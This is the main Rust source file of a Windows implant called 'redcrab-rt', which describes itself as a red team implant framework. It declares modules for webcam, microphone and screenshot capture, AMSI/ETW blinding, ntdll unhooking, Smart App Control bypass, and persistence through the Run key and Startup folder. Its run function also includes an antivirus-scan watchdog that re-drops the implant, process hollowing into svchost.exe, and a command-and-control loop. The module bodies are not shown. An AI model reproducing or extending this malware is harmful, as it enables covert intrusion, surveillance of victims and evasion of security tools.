//! redcrab-rt — red team implant framework
//! Build: python builder.py

#![no_main]
#![allow(unused_imports, dead_code)]

mod defs;
mod utils;
mod syscall;
mod loader;
mod stomp;
mod spoof;
mod sleep;
mod etw_patch;
mod unhook;
mod sac_bypass;
mod ppldump;
mod pe_obfuscate;
mod indirect_syscall;
mod threadless_inject;
mod screenshot;
mod webcam;
mod mic;
mod filetransfer;
mod selfdestruct;
mod antidetect;
mod watchdog;       // NEW: scan watchdog — detects AV scan → destruct+resurrect
mod resurrect;      // NEW: re-key + re-drop self to new path before dying
mod persist;        // NEW: Run key + Startup folder — survives reboot/shutdown
mod hollow;         // NEW: hollow into svchost.exe post-reboot
mod c2;

use defs::*;
use utils::djb2;

const PAYLOAD: &[u8] = &[0x90];

// Patched by builder.py
const SLEEP_KEY: [u8; 16] = [
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
];

#[no_mangle]
pub extern "system" fn WinMainCRTStartup() {
    unsafe { run() };
}

unsafe fn run() {
    // 0. Environment checks — sandbox/debugger/AV → instant self-destruct
    antidetect::check_environment();

    // 1. Register Defender kill-signal handler
    selfdestruct::register_ctrl_handler();

    // 2. SAC bypass
    sac_bypass::bypass_sac();

    // 3. Unhook ntdll
    unhook::unhook_ntdll();

    // 4. ETW + AMSI blind
    etw_patch::apply_all_blinds();

    // 5. Install persistence (Run key + Startup folder) so we survive shutdown
    let own_path = own_path();
    persist::install(&own_path);

    // 6. Start scan watchdog on background thread
    //    On scan detection: drop re-keyed copy → update persistence → self-destruct
    watchdog::start(&SLEEP_KEY);

    // 7. Hollow into svchost.exe — from this point Task Manager shows svchost
    let mut payload_buf = PAYLOAD.to_vec();
    pe_obfuscate::xor_payload_inplace(&mut payload_buf, &SLEEP_KEY);
    pe_obfuscate::xor_payload_inplace(&mut payload_buf, &SLEEP_KEY);
    hollow::hollow_into_svchost(&payload_buf);

    // 8. Post-exec concealment in current process
    stomp::stomp(0 as _, 0 as _, payload_buf.len());
    spoof::spoof_stack();
    pe_obfuscate::secure_zero(&mut payload_buf);

    // 9. C2 callback loop
    c2::callback_and_loop();

    // 10. Clean operator exit — remove persistence + wipe self
    persist::uninstall();
    selfdestruct::destruct();
}

unsafe fn own_path() -> String {
    let mut buf = vec![0u16; 32768];
    let n = winapi::um::libloaderapi::GetModuleFileNameW(
        std::ptr::null_mut(), buf.as_mut_ptr(), buf.len() as u32,
    );
    String::from_utf16_lossy(&buf[..n as usize])
}
